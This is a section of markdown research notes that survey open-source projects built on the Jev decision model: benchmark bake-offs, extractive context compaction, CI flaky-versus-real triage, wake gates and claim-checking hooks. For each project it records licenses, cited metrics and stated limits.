## 49. Boundary map, Harbor bake-off vs constrained LLMs, dual-process (2026-09-18 ~15:52 Boise)

America/Boise ~15:52 = 21:52 UTC (archive 214908). Docs-only fold into
open PR #2 (`cursor/augustus-store-envelope-00b4`). Not a competing
PR. Archer 27B drop still **WATCH** (still ~2026-09-19; not landed).
X MCP flap blocked discourse this hour — no tweets invented. Identity
lock vs `typesafe-ai` / `tenbin` / `decision-first` holds. No wrapper,
no install.sh, no copied `uv` / `von serve` / pip how-tos. No invented
metrics. Do not re-fold §48 items, blackwood-rlcd, open-jev-laya-bench,
decision-token LoRA, jevgate, wellposed, jev-reflex-autonomy-lab, Abide,
kev species, jevpandas, bitrate-advisor.

Backend-agnostic: these are **placement / measurement** cards
(extractable-from-state axis; Harbor-style frozen-protocol bake-off;
recompute-from-logs feedstock; Kahneman S1 decide / S2 generate;
combinatorial assembly ≠ extractive keep/drop; packed one-forward open
LLM economics; tiny non-AR local surface). TypeSafe Jev is the
exemplar in the READMEs, not a monopoly. kev is a **star/activity
delta only** this hour (100★ this pass; user cited 97).

### HIGH

1. **[`Zaious/jev-capability-atlas`](https://github.com/Zaious/jev-capability-atlas)**
   (README claims MIT; GitHub SPDX **NOASSERTION** this pass; Python;
   created 2026-09-18T21:30:40Z; 0★; unofficial, not TypeSafe).
   Independent **when-it-holds map with real API receipts**, not a
   leaderboard. They cite [jev-benchmarks](https://github.com/AbdelStark/jev-benchmarks)
   and thaiexam charts; they do not redo them. Primary mental model
   this hour: **place the task on one axis** —

   > Is the correct answer fully recoverable from the `state` you hand
   > the model, or does it require outside knowledge that is not in
   > `state`?

   **Self-contained (strong):** classification they cite from
   jev-benchmarks (AG News 91%, Banking77 **87%** — a *different*
   protocol from DMB 76.3% and jevals.com 79.67%; do not merge);
   citation support-checking with claim + quote both given
   (`paraphrase_support` and `reversed_meaning_high_overlap` both
   correctly judged); sarcasm when the trigger is in the given text.
   **Not self-contained (fails, often confidently):** pure recall
   without a supporting passage; scoring that needs a whole-field
   comparison; genuinely overlapping categories.

   **History suite** (`suites/history-recall-context/`, receipt
   `runs/2026-09-19.json`; N=3, single annotator, Chinese history
   only — qualitative axis proof, **not** a knowledge-breadth
   estimate). Cite the table, not the README's 30-second slogan:

   | Case | Question | Context? | Pick | Conf | Dist | Correct? |
   |---|---|---|---|---|---|---|
   | A | 2nd Qing emperor | No | Yongzheng | 0.90 | 0.04 / 0.93 / 0.03 | ✗ (Kangxi by popular convention; ground truth itself contested) |
   | B | 7th Qing (obscure) | No | Xianfeng | 0.07 | 0.25 / 0.37 / 0.38 | ✓ by luck (near-flat) |
   | C | Same as B | Passage in state | Xianfeng | 0.97 | 0.00 / 0.02 / 0.98 | ✓ |

   Informal unsaved B rerun picked Daoguang at 0.08 — both near-flat.
   Teaching: **bare memory is unreliable; reading comprehension over
   supplied text is reliable.** Conflating the two misjudges the risk.
   Retrieve first; put the passage in `state`.

   **Not a state machine internally** (distributed LM understanding —
   paraphrase vs reversed-meaning contrast). **Correctly placed as a
   component node** in *your* code ("a node in your state machine" is
   the architectural instinct; "its internals are a state machine" is
   not). Confidence is a **statistic from the distribution** (RLCD
   trains the distribution; `confidence` is arithmetic on how peaked
   it is), not a second trained correctness score. Calibration is
   **population-level** and can fail **dangerous-high**: DAIR Emotion
   via jev-benchmarks — 48% acc, mean conf **0.819**, 16% of items
   p(correct)=0. That is the "blind guessing" concern that actually
   lands: overlapping blurred categories, overconfident.

   **Browser-use strength is placement, not vision.** Third-party
   `jev-ultrafast` (Browser Use): Google Flights 9.5s → 7.1s; 12-task
   vs Playwright MCP 1.5× faster / 1.6× cheaper, comparable accuracy;
   standalone loop ~1.8s / $0.0005 / 97% (their figures, not
   re-run). Jev is text-only. What held: **DOM snapshot as `state`**
   (a visual task translated into extractive text) + **speculative
   fan-out** over candidate elements. Not screenshots. Same
   component-node placement as lizard-agent / solari-reflex.

   Pattern: **boundary map / placement judgment.** Cards:
   `mental-models.md` (primary); `faq.md`; `question-design.md`;
   `applied-mappings.md` §2 / §6; `mappings.md` §3 / §6; `mixed-architecture.md`.

2. **[`nibzard/decision-model-benchmark`](https://github.com/nibzard/decision-model-benchmark)
   (DMB)** (LICENSE **absent** this pass; Python; created
   2026-09-18T21:48:07Z; 0★; no vendor sponsorship). Independent
   **frozen protocol**: typesafe:jev vs **8 constrained LLMs** vs
   **3 deterministic baselines** (keyword / majority / random). Five
   suites, 60 cells, **$28.34** measured spend; every raw log
   published. **`results/v2/v2.md` is the report of record** (v1
   majority-prior defect corrected; mixed protocol versions merged
   by explicit `--allow-protocol-mix`). Harbor-style measurement
   exemplar: protocol frozen before the run; negative results ship;
   recompute from logs; unknown usage is never a measured zero; later
   runs replace cells whole. Do not copy `uv` how-to.

   **jev (v2, named receipt, not a ranking):**

   | Suite | Acc | Notes |
   |---|---|---|
   | S1 banking77 77-way | **76.3%** | ECE 0.083; cost/1k **$0.07**; p50 **274 ms** |
   | S2 SMS spam | **93.0%** | ECE 0.249 (overconfident vs GLM 0.042) |
   | S3 cardinality | **100%*** | valid coverage **72.7%** (225 failed = **256+ Choice cap**, `400 Too many choices`); 254–255 still 100% |
   | S4 order permute | **76.7%** | flip **13%** (worst LLM 37%) |
   | S5 honesty | **14.3%** | admits-ignorance **49.7%** vs most LLMs 97.3–100% (gpt-5.4-mini **64.7%**); ECE **0.246**; mean conf on no-good **0.543** |

   p50 across jev cells **264–276 ms**, flat 2→255 options. Fastest
   *measured* vs thinking-mode LLMs is **10–16×**, **1.2×** vs
   gpt-oss-120b on Cerebras — **not** the vendor 40–200× claim
   against LLMs left in their slowest default. gpt-oss-120b banking
   **81.3%**; glm-5.3 **80.4%** / spam **94.9%**. **No class wins on
   quality.** Axes that *do* separate: latency, cost, schema-validity
   (jev 0% malformed), Choice cap, honesty. Two OpenAI models sit
   *below* the 87.7% majority baseline on spam.

   **Do not collapse Banking77:** atlas/jev-benchmarks **87%**, DMB
   **76.3%**, jevals.com 2026-09-18 **79.67%** — n / split / protocol.
   Cite named receipts. Pattern: **Harbor/jevals practice +
   when-to-use-vs-constrained-LLM table.** Cards: `validation.md`;
   `judgment-class.md`.

3. **[`Jevals/jevals-data`](https://github.com/Jevals/jevals-data)**
   (CC-BY-4.0; created 2026-09-18T21:36:00Z; 0★). Release boards +
   per-decision JSONL run logs + suite files behind
   [jevals.com](https://jevals.com). Cite "Jevals (jevals.com),
   release \<release\>". **2026-09-18** board: suite **0.1.0**, **8
   systems**, tasks banking77 / helpsteer2 / pubmedqa. Formulas at
   https://jevals.com/methodology/. **Recompute-from-logs pattern**,
   not a third ranking to merge with DMB or atlas.

   Jev on *this* board (native probabilities; n=300 × 5 repeats;
   **not** DMB n): banking77 acc **0.7967**, ECE **0.0981**, p50
   **467 ms**, cost/1k **$0.043**; helpsteer2 Score acc **0.4127**
   (label-prior 0.4167 — barely above chance on that primitive);
   pubmedqa Noul acc **0.9127**, ECE **0.0504**, p50 **438 ms**. Do
   not dump the board as a ranking. Feedstock for Harbor/jevals:
   frozen suite files, item ids pointing at public datasets (item
   text not republished), run header + per-decision rows
   (`item_id`, `epoch`, `target`, `order_seed`, `output`,
   `usage`, `cost_usd`, `seconds`, `malformed`, `refusal`,
   `retries`). Cards: `validation.md`.

4. **[`taro1985/dual-process-ai`](https://github.com/taro1985/dual-process-ai)**
   (MIT; Python; created 2026-09-18T20:55:08Z; 0★). Explicit
   **Kahneman S1 (Jev) / S2 (Gemini)** design pattern. S1: typed
   decision + confidence, ~70–500 ms. S2: free-form text. Mechanism:
   `confidence ≥ τ → S1 decides; else escalate to S2`. **Routing
   fails open** (low conf → S2; the router never refuses). **Safety
   fails closed** (unparseable denied). **Routing accuracy is not
   measured yet** (misroute rate / escalation rate / Brier on
   held-out — the numbers this project needs and does not have).
   Without a key it runs **degraded keyword mode** — **not an
   equivalent S1** (no calibrated confidence; anything not on the
   allowlist escalates). Do not copy hooks / Discord / pip. Crossover
   metaphor for **business/life**, not only SWE: cheap classify /
   route / gate on S1; write / reason / generate on S2. Same split as
   jev-reflex-autonomy-lab (S1 keeps control) and jev-hermes (route ≠
   memory), productized as a cascade. Cards:
   `mixed-architecture.md`; `toolbox-mapping.md`; `mappings.md` §2;
   `agent-self-assessment.md`; `faq.md`.

### MED (brief)

5. **[`simonmesmith/jev-arc-agi-v1-experiment`](https://github.com/simonmesmith/jev-arc-agi-v1-experiment)**
   (LICENSE **absent** this pass; Python; created 2026-09-18T21:32:19Z;
   0★). Direct Jev on ARC-AGI-1 public eval: **4/400 (1%)** fully
   solved; **1.125%** task-weighted (4 + 0.5 / 400); **5/419** exact
   grids; **~$2.32**; **10 minutes**; `jev-1.13.0`; two guesses per
   grid. **Cell-wise Choice assembly:** height/width 1–30, then one
   of ten colours per cell; cells do not see one another; transpose
   for the second guess. Dimensions ~**90%** on first attempt; rarely
   a complete grid. No partial credit for cells. Teaching:
   **combinatorial grid tasks ≠ extractive keep/drop.** A program
   library with no competing candidates **never called Jev** (6
   tasks / 1.5%). Combined policy 2.375% includes hand-written
   programs — tells you less about Jev. Frozen protocol, traces,
   `PROTOCOL.md`. Not a ceiling claim. Cards: `validation.md`;
   `mappings.md` §9; `faq.md`.

6. **[`ikermoel/open-alternative-jev`](https://github.com/ikermoel/open-alternative-jev)**
   (Apache-2.0; Python; 3★; Space
   [`IkerMoel/open-alternative-jev`](https://huggingface.co/spaces/IkerMoel/open-alternative-jev)).
   Packed **one-forward** System One on **any open-weights LLM**
   (HF + vLLM). **Not a Jev reproduction** — packages a capability
   chat APIs hide; no claim about how Jev works. RACE-H (250
   passages × 4 questions, n=1000) on Qwen3.6-27B 8-bit: packed
   **92.9% @ 4.55 q/s** vs one-at-a-time 92.6% @ 1.66; 2.5× fewer
   tokens. Interference **6–9%** of answers move vs a 2.7% numeric
   noise floor; order rotation 8% MMLU / 2.4% RACE-H. Temperature
   scaling ECE 5.4%→2.1% MMLU, 2.8%→1.1% RACE-H. Small 4B packing
   costs 2.8 points — use `separate` when accuracy at stake. On
   vLLM, prefix-cache `separate` is fastest. Economics/architecture
   of **open replicas on the constrained-AR / logprob path**, not
   trained decision-only. Cards: `judgment-class.md`.

7. **[`wfzyx/von`](https://github.com/wfzyx/von)** (Apache-2.0;
   Python; 3★). **14 MB** Needle 3 SAN; non-AR local `POST
   /v1/systemone` drop-in; sub-15 ms CPU *claim* / ~**38 ms** embed
   in their table; ~28 MB RAM. Default needle **52.6%** balanced acc
   on OpenJev `authored144` — **not a calibrated Jev replica**. Other
   backends (berta-v3 / modern / laya) are optional heavier heads.
   **Do not copy the vs-Jev ranking table** (includes a speculative
   Jev weight estimate). Distinguish: jev-local **stub until hf**;
   kev **trained pointer** on Qwen2.5-0.5B; von **tiny SAN** at the
   extreme of the speed/econ class. Cards: `judgment-class.md`;
   `faq.md`.

8. **[`jaredpalmer/kev`](https://github.com/jaredpalmer/kev) delta**
   — still active this hour; **100★** this pass (user cited 97;
   prior fold 61★). Pushed through 2026-09-18T21:51Z. **Light note
   only.** No species rewrite. Hub weights + NOTA training remain
   §45.

### Not this hour

Archer drop **not landed**. X discourse **blocked** (MCP flap) — no
invented tweets. Do not re-fold §48.

Cards: `mental-models.md` (boundary map); `validation.md` (DMB +
jevals-data + ARC); `judgment-class.md` (vs constrained LLM; von;
open-alternative-jev); `mixed-architecture.md` (dual-process;
component node; DOM-as-text); `faq.md`; `mappings.md` §2 / §3 / §6 /
§9; `applied-mappings.md`; `question-design.md`; `methods-catalog.md`;
`toolbox-mapping.md`; `agent-self-assessment.md`. No wrapper.

## 50. GLiNER2.5 extractive compaction — encoder backend, same keep/drop job (2026-09-18 ~16:22 Boise)

America/Boise ~16:22 = 22:22 UTC. Docs-only fold into open PR #2
(`cursor/augustus-store-envelope-00b4`). Not a competing PR. Archer
27B drop still **WATCH**. Identity lock vs `typesafe-ai` / `tenbin` /
`decision-first` holds. No wrapper, no `--plugin-dir` / `uv` how-to,
no copied timeouts or Hub download scripts. No invented metrics.
**Not Jev. Not multimodal.** Do not re-fold §48 extractive recipes,
§49 bake-off, Abide, kev, GLiGuard as a species rewrite, or
pi-jev-compaction as a new product.

Backend-agnostic: this is a **compaction / context-sieve placement**
(pointer keep-drop, soft Choice under a hard mutation envelope,
shadow-mode rollout). TypeSafe Jev is one backend for that *job*
(`tamaratran/fast-jev-compaction`, `vava-nessa/pi-jev-compaction`);
GLiNER2.5 is another. Augustus stays family-first.

### HIGH

1. **[`m-newhauser/gliner25-compaction`](https://github.com/m-newhauser/gliner25-compaction)**
   (Apache-2.0; Python + Claude Code plugin; created
   2026-09-18T17:22:34Z; 1★ at capture). Local, **evidence-first**
   context compaction. Default checkpoint
   [`fastino/gliner2.5-base-v1`](https://huggingface.co/fastino/gliner2.5-base-v1)
   (checkpoint model card Apache-2.0 per their README) chooses a
   retention action for **completed** eligible tool interactions and
   extracts **exact source spans** when the full result is unnecessary.
   **Not a prose summarizer.** User and assistant text unchanged.
   Retained evidence is copied from original **character offsets**.
   Mutating tool interactions are preserved in full. Inference runs in
   a local Python worker after Hub download; transcript analysis does
   not require a remote inference API.

   Per completed pair, one retention action (closed set):

   - `keep_full` — complete call and result
   - `keep_evidence` — exact excerpts from the result
   - `keep_call_only` — call stays; result replaced with a rerun notice
   - `drop` — paired call and result removed

   Inputs: current goal, nearby conversation, tool name and input,
   original tool result. Deterministic safeguards override uncertain
   predictions, protect validated diagnostic spans, preserve recent
   messages and mutations, validate exact offsets, and reject orphaned
   tool results.

   **Four load-bearing mental models (architecture, not a plugin
   catalog):**

   1. **Pointer / extractive, not generator.** Same family as
      [testimonial-miner](https://github.com/AppitStudio/testimonial-miner)
      and [jev-reviewer](https://github.com/choxos/jev-reviewer)
      (`notes.md` §48): the model **selects**; code **copies
      verbatim**. Compaction that invents a prose summary is a
      different (worse) species for auditability. GLiNER locate is not
      a footnote here — character offsets *are* the keep/drop
      candidates. One local multi-head does **categorize** (which
      retention action) and **locate** (which spans) in the same job
      (`judgment-class.md` species map).

   2. **Soft retention Choice under a hard envelope.** Code owns the
      mutation monitor: mutating tools, unknown shell, and shell
      control operators / pipelines / substitutions / redirections are
      treated as mutating → `keep_full`. Missing or invalid evidence
      **fails closed to `keep_full`**. Low-confidence retention
      predictions likewise fail closed to `keep_full`. Contrast: many
      Jev *preference / remainder* gates fail-open (Abide; jevgate
      cannot block). Compaction *drop* (and lossy `keep_evidence`) is
      the irreversible act, so the authorized reduction fails closed.
      From the evidence-preservation view the outcome looks like
      context-sieve "keep on error" (`applied-mappings.md` §1) — name
      the *act*, not the slogan. Conservative shell over-retention is
      their documented limit, not a bug to "fix" by failing open.

   3. **Same compaction job, encoder backend.**
      [`tamaratran/fast-jev-compaction`](https://github.com/tamaratran/fast-jev-compaction)
      asks two Nouls (should the *call* stay? should the *result* stay
      verbatim?). [`vava-nessa/pi-jev-compaction`](https://github.com/vava-nessa/pi-jev-compaction)
      is the Pi cousin: verbatim drop, never summarize. Here GLiNER2.5
      chooses discrete retention actions + evidence spans. Fastino /
      GLiGuard sibling *class* (schema-in-encoder, local) — not a
      GLiGuard safety-schema clone, not a Jev Score, not a Noul.
      Augustus does not pick a vendor for the hole.

   4. **Shadow mode as safe rollout.** Public default `shadowMode:
      true`: local analysis logs the proposed reduction **without
      replacing session history** until explicitly set false. Same
      rollout instinct as jev-harness / is-malicious (log would-do
      first). Compaction mutates memory; shadow is the default because
      a bad drop is not a reversible token cost.

   **Limits (theirs, README; experimental).** Reduction measured in
   **characters, not tokens**. Conservative shell policy may retain
   commands that are actually read-only. Only completed
   tool-call/result pairs are candidates. Domain-specific tuning and
   broad production evaluation remain future work. No published
   token-reduction or retention-quality rates this pass — do not
   invent them. Their config defaults (`minimumConfidence` 0.7,
   `minimumEvidenceConfidence` 0.5, `minReductionRatio` 0.25,
   `preserveRecentMessages` 6) are *their* knobs, not class constants.

   **Siblings — complementary, do not merge.**

   - **`24601/rh-guard`:** reward-hack / eval-integrity on tool use.
     Shared notes only: fail-closed retention, hard shell mutation
     policy, shadow-mode rollout. Different hole. This is not
     reward-hack detection.
   - **GLiGuard:** Fastino encoder sibling (safety-schema classify).
     Compaction is locate+categorize on tool transcripts, not LLM I/O
     moderation.
   - **Abide:** same Claude Code hook-host surface; Abide is fail-open
     Score on diffs; this is fail-closed `keep_full` on compaction.

   **Placement.** Context sieve + exact-text keep/drop
   (`applied-mappings.md` §1–§2). Pillar: selective classification /
   SDT criterion (false drop >> false keep) + runtime-assurance
   sandwich (mutation monitor in code). Hole: sieve / keep-drop.
   Family: GLi\* encoder (GLiNER2.5 local multi-head). Fail-closed on
   the reduction. Eval path: none published this pass (experimental);
   characters≠tokens is the honesty constraint. **Empirical** as
   README behavior. **Hypothesis** that the same envelope transfers to
   *your* transcript domain. Cards: `judgment-class.md` (primary);
   `applied-mappings.md` §1–§2; `mappings.md` §12 / §18;
   `mixed-architecture.md`; `faq.md`; `mental-models.md`;
   `methods-catalog.md`; `toolbox-mapping.md`;
   `agent-self-assessment.md`. No wrapper.

### Omni / Jev-omni

Not multimodal. Usage: extractive context management as a
perception/memory hygiene stage **before** decide. Archive +
landscape pointer.

## 51. CI merge-gate, fail-open wake VOI, S1 indexer, claim-evidence Stop (2026-09-18 ~16:48 Boise)

America/Boise ~16:48 = 22:48 UTC. Docs-only fold into open PR #2
(`cursor/augustus-store-envelope-00b4`). Not a competing PR. Archer
27B drop still **WATCH**. Identity lock vs `typesafe-ai` / `tenbin` /
`decision-first` holds. No wrapper, no npm/wrangler/install.sh/devenv
how-to, no copied ports, thresholds as class constants, or invented
metrics. Do not re-fold §50 GLiNER2.5 compaction, §49 bake-off, Abide,
kev, pi-jev-approver, jevgate, or rh-guard as a species rewrite.

Backend-agnostic: this hour is **decision-model as classifier /
gate / coordinator** (flaky-vs-real CI, VOI resume, S1 extract +
escalate-S2, claim/evidence integrity, Harbor on/off routing,
policy-as-judgment). TypeSafe Jev is the documented exemplar, not
the monopoly. Augustus stays family-first.

### HIGH

1. **[`CaseReed/latch`](https://github.com/CaseReed/latch)**
   (MIT; TypeScript; created 2026-09-18T22:09:12Z; 0★ at capture).
   Merge-gate triage for a **finished** red test run (Playwright /
   Jest / pytest / JUnit XML): cluster failures by signature in
   **code**, TypeSafe Jev labels each cause (one call per cluster, at
   most 8; cached free), **code owns** Gate: PASS (infra noise) vs
   Gate: BLOCK (real failure). The judge never gets to say "ignore"
   alone. `ignore_as_infra` needs `env_cascade` + an infra
   fingerprint. Missing key still prints clusters (`needs_human` /
   `no_key`) and **never fails Playwright** — the reporter is
   fail-open; `--gate` is a **separate** CI step.

   Demo (offline, README): 8 identical connection errors → 1 cause →
   Gate PASS; 5 failing assertions → Gate BLOCK. Policy (theirs, not
   class constants): no key / API error / `cause.confidence < 0.55` /
   `same_root < 0.5` → `needs_human`; `env_cascade` + `same_root >=
   0.7` + fingerprint → `ignore_as_infra`; flake / locator_drift →
   `fix_test`; `assertion_bug` and (`blocks_merge >= 0.55` or Jev
   `action = fix_product`) → `fix_product`. `blocks_merge` sits in a
   noise band ~±0.03; 0.55 is in the empty gap (their calibrate
   claim).

   **Limits (theirs).** Grouping is message-based; a logic regression
   fragments. Measured on `pallets/click`: 2 real regressions → 13
   failures → **10 clusters**. The "70 → 1" figure is an infra-cascade
   property, not a general one. Signature = `apiName` + first 80 chars
   of the normalized error. Error text is redacted in every output.

   **Four load-bearing mental models:**

   1. **Cluster in code, judge labels, policy decides.** Same split as
      OpenSmoke (scan every step; LLM autopsy only on flags): the
      model estimates a *cause class*; the merge act is a table.
      Internals are not a state machine; placement is a component
      node (`notes.md` §49).
   2. **Decision-model as CI flaky-vs-real classifier.** The hole is
      SDT criterion (false PASS on a real bug >> false BLOCK on
      infra), not "make CI smarter." Pair with Harbor (frozen
      artifacts × PASS/BLOCK labels; independent verifier) and
      rh-guard (eval-integrity — do not let the agent game the tests
      latch is classifying). Different holes; shared notes only.
   3. **Fail polarity is per surface.** Reporter never fails
      Playwright (false block of the *run* loses evidence). `--gate`
      fails closed on merge when a cluster is not confirmed infra.
      Name the *act*.
   4. **Do not copy the reporter.** Thresholds, ledger path, and npm
      wiring stay theirs.

   **Placement.** Environment / harness triage
   (`applied-mappings.md` §3) + decision circuits (`mappings.md` §3)
   + SDT (`mappings.md` §7). Pillar: SDT + Leveson sensor≠constraint.
   Hole: triage / gate. Family: closed decision API. Eval path: none
   published as Harbor this pass (demo + unit goldens). **Empirical**
   as README behavior / demo. **Hypothesis** that the same cluster →
   label → policy transfers to *your* runner. Cards:
   `applied-mappings.md` §3; `mappings.md` §3 / §7 / §18;
   `mixed-architecture.md`; `validation.md`; `faq.md`. No wrapper.

2. **[`shitianfang/wakegate`](https://github.com/shitianfang/wakegate)**
   (MIT; TypeScript; created 2026-09-18T22:13:11Z; 0★). Fail-open
   **wake gate** before resuming a sleeping agent (Workers / Durable
   Objects / Node). One typed question: given `waitingFor` plus an
   optional event/observation, is this worth a full LLM turn? Code
   owns sleep duration, skip counters, and force-wake. Skip only if
   Jev answers **and** p(wake) < 0.2. Every other path wakes:
   `fromUser`, nothing-to-judge, skip-limit (default 10), error / no
   key / timeout (5 s), unsure band 0.2–0.5, p ≥ 0.5.

   **Eval (theirs; discount).** 21/21 on 21 hand-written scenarios
   (11 wake / 10 sleep); p50 253 ms, p95 519 ms (n=21). Two of the
   11 correct wakes came only from the unsure band (calendar invite
   0.38; sold out 0.48). Same person wrote the scenarios and the
   question. First yes/no wording scored 16/21 on this set. Current
   three-way Choice picked on a separate 16-scenario **dev** set
   (not in repo). **Smoke, not a benchmark.** Savings unmeasured.

   **Contrast (fail polarity, not products).**
   [`phin-tech/pi-jev-approver`](https://github.com/phin-tech/pi-jev-approver)
   fails **closed** without a key (tool remainder). jevgate **cannot
   block** (allowlist proves; remainder fail-open). Compaction
   (`notes.md` §50) fails closed to `keep_full` because *drop* is
   irreversible. Wake *skip* is the irreversible act here (the agent
   stays asleep), so the authorized skip is the rare, high-confidence
   path; everything else wakes. Horvitz mixed-initiative / VOI: pay
   for the LLM turn only if EV(decision) beats the token cost; a
   regex / user-message / skip-limit already answers without a model
   (meta-VOI). Event/observation are untrusted; `maxSkips` bounds
   sleep, "neither is a security boundary" (their README).

   **Placement.** VOI / gather (`mappings.md` §6) + durable-agent
   control (`mappings.md` §14, Hypothesis) + mixed-architecture
   per-action fail table. Hole: gate / abstain. Family: closed
   decision API. **Empirical** as README safety table. **Hypothesis**
   as production savings. Do not copy wrangler/npm. Cards:
   `mappings.md` §6 / §18; `mixed-architecture.md`; `faq.md`.

3. **[`GreyssonEnterprises/s1-graphify-indexer`](https://github.com/GreyssonEnterprises/s1-graphify-indexer)**
   (+ sibling [`s1-indexer`](https://github.com/GreyssonEnterprises/s1-indexer);
   created 2026-09-18T22:23:04Z / 22:21:15Z; 0★; **license not on
   GitHub this pass — do not invent**). Local-first semantic
   indexer: small zero-shot System-1 models build a knowledge graph
   of a repo; an LLM is used only on the ambiguous tail, and **only
   when the System-1 backend actually loaded**. Default backend
   `gliner2`. Stubs `jev` and `needle` ship `available=False` until
   implemented. GitHub one-liner "10–50× faster than LLM-based
   indexing" is a **target, not a measured speedup**. README: do not
   treat it as a benchmark until the table is filled from one repo,
   both backends, same machine. Table is TBD.

   If GLiNER2 cannot load: artifacts still written (file nodes from
   the chunker, `run_status: degraded`), process exits nonzero, repo
   is **not** dumped to `S1_LLM_CMD`. `query` tokenizes, matches node
   names, walks two hops; no match prints `Insufficient evidence`;
   **it does not invent edges**. `gliner2[local]` extra is heavier
   than declared deps and is not pulled by default.

   **Mental model.** S1 zero-shot **locate/extract** (GLiNER spans /
   relations) on the bulk; escalate-to-S2 only on low-confidence
   remainder — same sandwich as allowlist ∩ remainder and as
   dual-process `conf ≥ τ` → S1 else S2, here the expensive act is
   *indexing tokens* not a chat reply. GLiNER-as-Jev-class cousin
   (`judgment-class.md` locate vs decide): the indexer is not a Noul.
   Same *family* as gliner25-compaction (encoder on code/text) with a
   different hole (graph construction vs memory keep/drop). Do not
   copy pip extras.

   **Placement.** Locate species + escalate-S2. Hole: perceive /
   gather. **Hypothesis** as 10–50×. **Empirical** as degraded-load
   and no-invent-edges README behavior. Cards: `judgment-class.md`;
   `mixed-architecture.md`; `faq.md`.

4. **[`VladyslavHontar/clear-head`](https://github.com/VladyslavHontar/clear-head)**
   (MIT; Python; created 2026-09-18T22:15:08Z; 1★). Claude Code
   **Stop** hook: Jev checks factual claims in the assistant's answer
   against **what it actually read this session**. Anti-hallucinated-
   done. Per claim, keyword-and-frequency retriever (not semantic)
   sends matching tool-output *lines* — not whole files. Classifies
   sentences as factual / proposal / recap / neither; then
   supports / contradicts / doesn't-address. Blocks on contradicted,
   or unsupported with **no** relevant evidence. Coverage below
   `JEV_EVIDENCE_FLOOR` (default 0.3) is "nothing relevant found";
   above the floor, "Jev can't confirm a specific derived fact" is
   usually their documented limit, not a block. `JEV_FIRM` default
   0.6: below that, logged, **never blocks**.

   **Limits (theirs).** Keyword retriever misses paraphrases and can
   match stale session evidence on generic overlap (no recency /
   topic-boundary). A true claim unread this session still flags
   unsupported. Excerpts leave the machine. Do not copy `install.sh`.

   **Placement.** Done-check / claim–evidence entailment
   (`agent-self-assessment.md`; `methods-catalog.md` NLI row).
   Pointer family with jev-reviewer: the model judges against
   retrieved lines, never against another model's prose. Hole: gate.
   **Empirical** as README behavior. **Hypothesis** as transfer to
   *your* transcript domain. Cards: `agent-self-assessment.md`;
   `applied-mappings.md` §2; `faq.md`.

5. **[`reification-labs/foreman`](https://github.com/reification-labs/foreman)**
   (created 2026-09-18T22:46:57Z; 0★; **no license field in
   `mix.exs` — do not invent**). GitHub description: "Parallel
   specialist agents returning typed, calibrated answers behind a
   single System Two foreman. Elixir/Phoenix, Jev/TypeSafe-native —
   `{value, probability}` everywhere." **The checkout is a stock
   Phoenix 1.8 scaffold.** README is the Phoenix generator starter;
   `AGENTS.md` is Phoenix guidelines; `mix.exs` has Phoenix/Ecto/
   Bandit/Req — **no typesafe / jev dependency**. Fold as
   **description-only greenfield**, not a measured product. Do not
   invent an Elixir Jev API.

   **Distinguish** from the existing "foreman" *shape* in
   `agent-self-assessment.md` (Kevthetech143/super-jev loop:
   progress/stuck/complete → continue/stop/retry/verify; the model
   estimates named probabilities; code owns hysteresis). Dual-process
   cousin of [dual-process-ai](https://github.com/taro1985/dual-process-ai)
   (`notes.md` §49): S1 specialists decide; S2 coordinates / writes.
   Typed probability everywhere is the *class* claim, not a receipt
   this pass.

   **Placement.** Mixed architecture / dual-process. **Watch /
   description-only.** Cards: `mixed-architecture.md`;
   `agent-self-assessment.md`; `mental-models.md`.

6. **[`vinilana/jev-gateway-bench`](https://github.com/vinilana/jev-gateway-bench)**
   (MIT; created 2026-09-18T22:29:58Z; 0★). Harbor-shaped bench for
   sibling [`vinilana/jev-gateway`](https://github.com/vinilana/jev-gateway)
   (MIT; product; fail-open if Jev down/slow/wrong key; never fails
   the LLM request). Real coding agents (Codex / Claude Code) on
   chess-engine tasks with Jev routing **on vs off**. Hidden verifier
   (perft + targeted checks) the agent never sees. Chess chosen
   because perft counts are published and one wrong rule changes
   them. Tasks: `chess-engine` (build), `chess-bugfix` (five injected
   bugs), `chess-san` (notation feature). Modes alternate; order
   swaps between reps.

   **Preliminary one-run (author: first signal, not a measurement;
   2026-09-18; Codex 0.154 / `gpt-6-astra` / `jev-latest`;
   `chess-bugfix`):** both 36/36 hidden checks; routing on 4 LLM req /
   76,678 in / 1,313 out / 35 s vs off 6 / 118,709 / 3,231 / 88 s;
   Jev 4 calls ~$0.0008. Jev forced `exec` three times (p 0.91 / 0.99
   / 0.94) then switched tools off to answer (0.98). An earlier pair
   the same day (pre token-metering fix) showed the same *shape* (4
   vs 6 requests; 40 s vs 69 s). With fewer than five runs per mode
   the summary says so. A cheaper unsolved run is not a saving. A
   wrongly forced tool can derail a turn. Do not copy npm/ports.
   Public repo caveat: an agent with web access could find the
   reference; tasks give no reason to look.

   **Placement.** Harbor/jevals practice (`validation.md`): taskset
   (chess + hidden verifier) × harness (Codex/Claude) × runtime
   (fresh gateway per run) × on/off treatment. Sibling of DMB
   (class bake-off) and jev-testbench (collab arms). **Empirical** as
   a *shape* and as one-run signal. **Hypothesis** as a cost/quality
   claim. Cards: `validation.md`; `methods-catalog.md`;
   `toolbox-mapping.md`.

7. **[`LightningK0ala/jev-marshal`](https://github.com/LightningK0ala/jev-marshal)**
   (created 2026-09-18T22:42:24Z). Description: "Repository rules for
   pull requests, enforced by Jev." **Empty git repo** this pass
   (default-branch 409). Fold as **Watch / description-only**. Cousin
   of Abide / jev-pref / if-ai (policy-as-judgment on a PR). No
   metrics, no fail polarity, no license to invent.

8. **[`LilDojd/jevons`](https://github.com/LilDojd/jevons)**
   (MIT; TypeScript; created 2026-09-18T22:43:34Z; 0★). Bounded **Pi**
   execution supervisor. README 100% slop badge. **Not a second
   coding agent:** Jev interprets evidence; ordinary code controls
   freshness, limits, and permitted responses. Skill selection (≤3
   or none), failure recovery (actual completed tool outcomes; exact
   repeats in code), review (chunk × rule), optional investigation,
   verification (select among configured commands; never generates
   them). Default recovery **shadow**. Steering (opt-in) delivers
   fixed replan/ask-user guidance, **never generated commands**.
   Optional pre-tool feedback is off by default. Distinguish from
   `phin-tech/pi-jev-approver` (fail-closed remainder) and
   `kevinpita/pi-jev-context` (sieve). Do not copy devenv/bun.

   **Placement.** Agent self-supervision lifecycle
   (`agent-self-assessment.md`) as a bounded supervisor, not a
   planner. Hole: gate / route. **Empirical** as README policy
   (shadow default). **Hypothesis** as improved task completion —
   "small fixture experiments are useful smoke tests, not evidence"
   (theirs). Cards: `agent-self-assessment.md`; `mappings.md` §9;
   `mixed-architecture.md`.

